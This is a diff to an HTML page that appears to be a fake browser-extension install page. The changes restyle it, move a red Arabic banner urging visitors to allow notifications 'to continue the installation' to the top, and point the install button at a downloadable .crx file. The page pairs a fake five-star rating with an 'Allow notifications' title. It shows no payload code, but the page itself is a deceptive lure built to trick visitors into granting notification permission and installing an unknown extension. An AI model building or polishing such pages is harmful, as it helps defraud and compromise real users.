@@ -11,20 +11,27 @@
       width: 100vw;
       height: 100vh;
       font-family: 'Roboto', sans-serif;
-      background-color: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background-color: #fff; /* ✅ خلفية بيضاء */
     }
-    .wrapper {
+
+    /* ✅ الشريط الأحمر أعلى الصفحة */
+    .re-header {
       width: 100%;
-      height: 100%;
-      max-width: none;
-      background: #000;
+      background-color: red;
+      color: white;
+      font-size: 16px;
+      text-align: center;
+      padding: 12px 0;
+      font-weight: bold;
+    }
+
+    .wrapper {
+      max-width: 980px;
+      margin: auto;
+      background: #fff;
       padding: 30px 40px;
       box-sizing: border-box;
-      overflow: auto;
-      color: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     .header {
       display: flex;
@@ -38,19 +45,8 @@
       font-size: 24px;
       margin: 0;
     }
-
-    /* ✅ الجزء المعدل */
-    .re-header {
-      background-color: red;
-      color: white;
-      font-size: 16px;
-      margin-top: 8px;
-      padding: 10px 15px;
-      border-radius: 4px;
-    }
-
     .provider {
-      color: #aaa;
+      color: #666;
       font-size: 14px;
       margin-top: 4px;
     }
@@ -86,18 +82,20 @@
 </head>
 <body>
 
+  <!-- ✅ الشريط الأحمر في أعلى الصفحة -->
+  <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>
+
   <div class="wrapper">
     <div class="header">
       <img src="icon.png" alt="Extension Icon">
       <div>
         <h1 class="title">Allow notifications</h1>
-        <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>
         <div class="provider">Provided by Example</div>
         <div class="rating">★★★★★</div>
       </div>
     </div>
 
-    <a href="Allow-notfications.zip" download class="install-btn">Install Extension</a>
+    <a href="extension.crx" download class="install-btn">Install Extension</a>
 
     <div class="preview-images">
       <img src="preview1.png" alt="Preview 1">
